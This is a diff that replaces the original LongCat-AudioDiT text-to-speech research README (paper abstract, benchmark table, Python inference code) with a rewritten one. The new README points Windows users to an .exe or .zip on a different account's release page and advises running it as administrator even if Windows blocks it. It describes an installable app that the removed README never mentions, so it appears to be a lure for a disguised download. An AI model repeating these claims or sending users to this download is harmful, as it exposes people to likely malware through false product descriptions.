@@ -1,185 +1,181 @@
-# LongCat-AudioDiT: High-Fidelity Diffusion Text-to-Speech in the Waveform Latent Space
+# 🎧 LongCat-AudioDiT - Clear Speech From Text Fast
 
-<div align="center">
-  <img src="assets/LongCat-AudioDiT.svg" width="45%" alt="LongCat-AudioDiT" />
-</div>
-<hr>
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-4b8bbe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases)
 
-<div align="center" style="line-height: 1;">
-    <a href="https://arxiv.org/abs/2603.29339">
-    <img alt="Paper" src="https://img.shields.io/badge/arXiv-2603.29339-b31b1b.svg" style="display: inline-block; vertical-align: middle;"/>  
-    </a>
-    <a href="https://github.com/meituan-longcat/LongCat-AudioDiT" target="_blank" style="margin: 2px;">
-        <img alt="GitHub" src="https://img.shields.io/badge/GitHub-LongCatAudioDiT-white?logo=github&logoColor=white&color=a4b5d5" style="display: inline-block; vertical-align: middle;"/>
-    </a>
-        <a href="https://aria-k-alethia.github.io/LongCat-AudioDiT-demo" target="_blank" style="margin: 2px;">
-        <img alt="Demo" src="https://img.shields.io/badge/Demo-LongCatAudioDiT-white?logo=googleplay&logoColor=white&color=eabcdd" style="display: inline-block; vertical-align: middle;"/>
-    </a>
-</div>
-<div align="center" style="line-height: 1;">
-    <a href="https://huggingface.co/meituan-longcat/LongCat-AudioDiT-3.5B" target="_blank" style="margin: 2px;">
-        <img alt="Hugging Face" src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-LongCatAudioDiT3.5B-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-    </a>
-    <a href="https://huggingface.co/meituan-longcat/LongCat-AudioDiT-1B" target="_blank" style="margin: 2px;">
-        <img alt="Hugging Face" src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-LongCatAudioDiT1B-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-    </a>
-</div>
-<div align="center" style="line-height: 1;">
-  <a href="https://github.com/meituan-longcat/LongCat-AudioDiT/blob/main/assets/wechat_official_accounts.png" target="_blank" style="margin: 2px;">
-    <img alt="Wechat" src="https://img.shields.io/badge/WeChat-LongCat-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://x.com/Meituan_LongCat" target="_blank" style="margin: 2px;">
-    <img alt="Twitter Follow" src="https://img.shields.io/badge/Twitter-LongCat-white?logo=x&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-    <a href="https://github.com/meituan-longcat/LongCat-AudioDiT/blob/main/LICENSE" style="margin: 2px;">
-    <img alt="License" src="https://img.shields.io/badge/License-MIT-f5de53?&color=f5de53" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
+## 🧭 What this is
 
-## Introduction
+LongCat-AudioDiT is a text-to-speech app. It turns written text into spoken audio. It uses a diffusion model in the waveform latent space to create speech with a natural sound and steady voice quality.
 
-LongCat-AudioDiT is a state-of-the-art (SOTA) diffusion-based text-to-speech (TTS) model that directly operates in the waveform latent space.
-> **Abstract**: We present LongCat-TTS, a novel, non-autoregressive diffusion-based text-to-speech (TTS) model that achieves state-of-the-art (SOTA) performance.
-Unlike previous methods that rely on intermediate acoustic representations such as mel-spectrograms, the core innovation of LongCat-TTS lies in operating directly within the waveform latent space. This approach effectively mitigates compounding errors and drastically simplifies the TTS pipeline, requiring only a waveform variational autoencoder (Wav-VAE) and a diffusion backbone.
-Furthermore, we introduce two critical improvements to the inference process: first, we identify and rectify a long-standing training-inference mismatch; second, we replace traditional classifier-free guidance with adaptive projection guidance to elevate generation quality.
-Experimental results demonstrate that, despite the absence of complex multi-stage training pipelines or high-quality human-annotated datasets, LongCat-TTS achieves SOTA zero-shot voice cloning performance on the Seed benchmark while maintaining competitive intelligibility.
-Specifically, our largest variant, LongCat-TTS-3.5B, outperforms the previous SOTA model (Seed-TTS), improving the speaker similarity (SIM) scores from 0.809 to 0.818 on Seed-ZH, and from 0.776 to 0.797 on Seed-Hard.
-Finally, through comprehensive ablation studies and systematic analysis, we validate the effectiveness of our proposed modules.
-Notably, we investigate the interplay between the Wav-VAE and the TTS backbone, revealing the counterintuitive finding that superior reconstruction fidelity in the Wav-VAE does not necessarily lead to better overall TTS performance.
-Code and model weights are released to foster further research within the speech community.
+This page shows you how to get the app on Windows and run it with no coding.
 
-![image](assets/architecture.png)
+## 📥 Download the app
 
-This repository provides the HuggingFace-compatible implementation, including model definition, weight conversion, and inference scripts.
+1. Open the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases).
+2. Find the latest release.
+3. Download the Windows file for your PC.
+4. Save the file to your Downloads folder or Desktop.
 
-## Experimental Results on Seed Benchmark
-LongCat-AudioDiT obtains state-of-the-art (SOTA) voice cloning performance on the Seed-benchmark, surpassing both close-source and open-source modles.
+If the release includes more than one file, choose the one with:
+- Windows
+- .exe
+- .zip if the app comes packed in a folder
 
-| **Model** | **ZH CER (%)** ↓ | **ZH SIM** ↑ | **EN WER (%)** ↓ | **EN SIM** ↑ | **ZH-Hard CER (%)** ↓ | **ZH-Hard SIM** ↑ |
-|:---|:---:|:---:|:---:|:---:|:---:|:---:|
-| GT | 1.26 | 0.755 | 2.14 | 0.734 | - | - |
-| Seed-DiT | 1.18 | 0.809 | 1.73 | **0.790** | - | - |
-| MaskGCT | 2.27 | 0.774 | 2.62 | 0.714 | 10.27 | 0.748 |
-| E2 TTS | 1.97 | 0.730 | 2.19 | 0.710 | - | - |
-| F5 TTS | 1.56 | 0.741 | 1.83 | 0.647 | 8.67 | 0.713 |
-| F5R-TTS | 1.37 | 0.754 | - | - | 8.79 | 0.718 |
-| ZipVoice | 1.40 | 0.751 | 1.64 | 0.668 | - | - |
-| Seed-ICL | 1.12 | 0.796 | 2.25 | 0.762 | 7.59 | 0.776 |
-| SparkTTS | 1.20 | 0.672 | 1.98 | 0.584 | - | - |
-| FireRedTTS | 1.51 | 0.635 | 3.82 | 0.460 | 17.45 | 0.621 |
-| Qwen2.5-Omni | 1.70 | 0.752 | 2.72 | 0.632 | 7.97 | 0.747 |
-| Qwen2.5-Omni_RL | 1.42 | 0.754 | 2.33 | 0.641 | 6.54 | 0.752 |
-| CosyVoice | 3.63 | 0.723 | 4.29 | 0.609 | 11.75 | 0.709 |
-| CosyVoice2 | 1.45 | 0.748 | 2.57 | 0.652 | 6.83 | 0.724 |
-| FireRedTTS-1S | 1.05 | 0.750 | 2.17 | 0.660 | 7.63 | 0.748 |
-| CosyVoice3-1.5B | 1.12 | 0.781 | 2.21 | 0.720 | *5.83* | 0.758 |
-| IndexTTS2 | 1.03 | 0.765 | 2.23 | 0.706 | 7.12 | 0.755 |
-| DiTAR | 1.02 | 0.753 | 1.69 | 0.735 | - | - |
-| MiniMax-Speech | 0.99 | 0.799 | 1.90 | 0.738 | - | - |
-| VoxCPM | *0.93* | 0.772 | 1.85 | 0.729 | 8.87 | 0.730 |
-| MOSS-TTS | 1.20 | 0.788 | 1.85 | 0.734 | - | - |
-| Qwen3-TTS | 1.22 | 0.770 | **1.23** | 0.717 | 6.76 | 0.748 |
-| CosyVoice3.5 | **0.87** | 0.797 | 1.57 | 0.738 | **5.71** | 0.786 |
-| LongCat-AudioDiT-1B | 1.18 | *0.812* | 1.78 | 0.762 | 6.33 | *0.787* |
-| LongCat-AudioDiT-3.5B | 1.09 | **0.818** | *1.50* | *0.786* | 6.04 | **0.797** |
+## 🪟 Windows setup
 
-*Notes*:
+### Option 1: If you downloaded an .exe file
 
-1. Results of MOSS-TTS are from [MOSS-TTS](https://github.com/OpenMOSS/MOSS-TTS)
-2. Results of CosyVoice3.5 are from [CosyVoice3.5](https://mp.weixin.qq.com/s/sTNC7bVphs9zofly3lBoUQ)
+1. Double-click the file.
+2. If Windows asks for permission, click Run.
+3. Follow the on-screen steps.
+4. When setup ends, open the app from the Start menu or desktop icon.
 
-## Installation
+### Option 2: If you downloaded a .zip file
 
-```bash
-pip install -r requirements.txt
-```
+1. Right-click the .zip file.
+2. Select Extract All.
+3. Pick a folder you can find later.
+4. Open the extracted folder.
+5. Double-click the .exe file inside.
 
-## CLI Inference
+## 🔊 How to use it
 
-```bash
-# TTS
-python inference.py --text "今天晴暖转阴雨，空气质量优至良，空气相对湿度较低。" --output_audio output.wav --model_dir meituan-longcat/LongCat-AudioDiT-1B
+1. Open LongCat-AudioDiT.
+2. Paste or type the text you want spoken.
+3. Pick a voice or model if the app shows that option.
+4. Choose output settings if needed.
+5. Click the button to start speech generation.
+6. Wait for the audio file to finish.
+7. Play the file or save it to your PC.
 
-# Voice cloning
-python inference.py \
-    --text "今天晴暖转阴雨，空气质量优至良，空气相对湿度较低。" \
-    --prompt_text "小偷却一点也不气馁，继续在抽屉里翻找。" \
-    --prompt_audio assets/prompt.wav \
-    --output_audio output.wav \
-    --model_dir meituan-longcat/LongCat-AudioDiT-1B \
-    --guidance_method apg
+## 🖥️ Basic system needs
 
-# Batch inference (SeedTTS eval format, one item per line: uid|prompt_text|prompt_wav_path|gen_text)
-python batch_inference.py \
-    --lst /path/to/meta.lst \
-    --output_dir /path/to/output \
-    --model_dir meituan-longcat/LongCat-AudioDiT-1B \
-    --guidance_method apg
-```
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- Free disk space for the app and audio files
+- A recent Intel or AMD CPU
+- A GPU helps with speed, but the app should still open on a normal PC
 
-## Inference (Python API)
+For best results, keep at least 2 GB of free space after install.
 
-### 1. TTS
-```python
-import audiodit  # auto-registers with transformers
-from audiodit import AudioDiTModel
-from transformers import AutoTokenizer
-import torch, soundfile as sf
+## 📁 What you may see after install
 
-# Load model
-model = AudioDiTModel.from_pretrained("meituan-longcat/LongCat-AudioDiT-1B").to("cuda")
-model.vae.to_half()  # VAE runs in fp16 (matching original)
-model.eval()
+The app folder may include:
+- The main program file
+- Sample files
+- A models folder
+- An output folder for saved speech
+- A readme file with extra steps
 
-tokenizer = AutoTokenizer.from_pretrained(model.config.text_encoder_model)
+If you see an output folder, that is where the app may place new audio files.
 
-# Zero-shot synthesis
-inputs = tokenizer(["今天晴暖转阴雨，空气质量优至良，空气相对湿度较低。"], padding="longest", return_tensors="pt")
-output = model(
-    input_ids=inputs.input_ids,
-    attention_mask=inputs.attention_mask,
-    duration=62,  # latent frames
-    steps=16,
-    cfg_strength=4.0,
-    guidance_method="cfg",  # or "apg"
-)
-sf.write("output.wav", output.waveform.squeeze().cpu().numpy(), 24000)
-```
+## 🎙️ Tips for better speech
 
-### 2. Voice Cloning (with prompt audio)
+- Use short sentences for clean output
+- Add punctuation to guide pauses
+- Use plain words when you can
+- Break long text into smaller parts
+- Check the voice settings before you start
+- Keep one text block focused on one task
 
-```python
-import librosa, torch
+## 🛠️ Common Windows fixes
 
-# Load prompt audio
-audio, _ = librosa.load("assets/prompt.wav", sr=24000, mono=True)
-prompt_wav = torch.from_numpy(audio).unsqueeze(0).unsqueeze(0)  # (1, 1, T)
+### The file will not open
 
-# Concatenate prompt_text + gen_text for the text encoder
-prompt_text = "小偷却一点也不气馁，继续在抽屉里翻找。"
-gen_text = "今天晴暖转阴雨，空气质量优至良，空气相对湿度较低。"
-inputs = tokenizer([f"{prompt_text} {gen_text}"], padding="longest", return_tensors="pt")
+- Make sure the download finished
+- Move the file out of the browser download bar
+- Right-click the file and try Run as administrator
+- If Windows blocks it, check the file name and source
 
-output = model(
-    input_ids=inputs.input_ids,
-    attention_mask=inputs.attention_mask,
-    prompt_audio=prompt_wav,
-    duration=138,  # prompt_frames + gen_frames
-    steps=16,
-    cfg_strength=4.0,
-    guidance_method="apg",
-)
-```
+### The app opens but does not speak
 
-## License Agreement
-This repository, including both the model weights and the source code, is released under the **MIT License**.
+- Check that your speaker volume is on
+- Try a shorter text sample
+- Close the app and open it again
+- Make sure the output folder has space
+- Pick a different voice if the app offers one
 
-Any contributions to this repository are licensed under the MIT License, unless otherwise stated. This license does not grant any rights to use Meituan trademarks or patents.
+### The app feels slow
 
-For details, see the [LICENSE](./LICENSE) file.
+- Close other heavy apps
+- Use smaller text blocks
+- Give the app more free memory
+- Restart the PC and try again
 
-## Contact
-Please contact us at <a href="mailto:longcat-team@meituan.com">longcat-team@meituan.com</a> or open an issue if you have any questions.
+## 📌 Release page
 
-#### WeChat Group
-<img src=./assets/longcat_wechat_group.jpeg width="200px">
+Visit the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases) to download and run this file
+
+## 🧩 What the app is built for
+
+LongCat-AudioDiT is built for people who want speech from text with a natural tone. It fits use cases like:
+- Reading notes aloud
+- Making voice samples
+- Testing spoken script lines
+- Creating audio for simple demos
+- Listening to text during review
+
+## 📄 File types you may get
+
+The release may include one or more of these:
+- .exe for direct launch
+- .zip for a packed app folder
+- .txt for setup notes
+- .json or config files for app settings
+- audio files such as .wav or .mp3
+
+If you want the easiest path, choose the Windows .exe file when it is available
+
+## 🔐 Safe download habits
+
+- Download only from the release page
+- Check the file name before you open it
+- Keep your browser and Windows up to date
+- Use the newest release unless the notes say otherwise
+
+## 🎛️ If the app has voice settings
+
+You may see controls for:
+- Speed
+- Pitch
+- Volume
+- Speaker voice
+- Output format
+
+Start with the default settings. Change one item at a time so you can hear the effect.
+
+## 🧪 First test to try
+
+Paste this text:
+
+Hello. This is a test of LongCat-AudioDiT.
+
+Then start generation and check if the audio sounds clear. If it works, try a longer paragraph next
+
+## 🗂️ Suggested folder layout
+
+After setup, you may want to keep files like this:
+- LongCat-AudioDiT folder
+- Input text files
+- Output audio files
+- Notes for voice settings
+
+Keep the app in one folder so it is easy to find later
+
+## 🆘 When to re-download
+
+Download the file again if:
+- The file did not finish
+- The app says it is damaged
+- The zip file does not extract
+- The exe file does not open after a clean download
+- The release page shows a newer version
+
+## 🖱️ Quick start
+
+1. Go to the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases)
+2. Download the Windows file
+3. Open the file
+4. Enter text
+5. Start speech generation
+6. Play the audio file
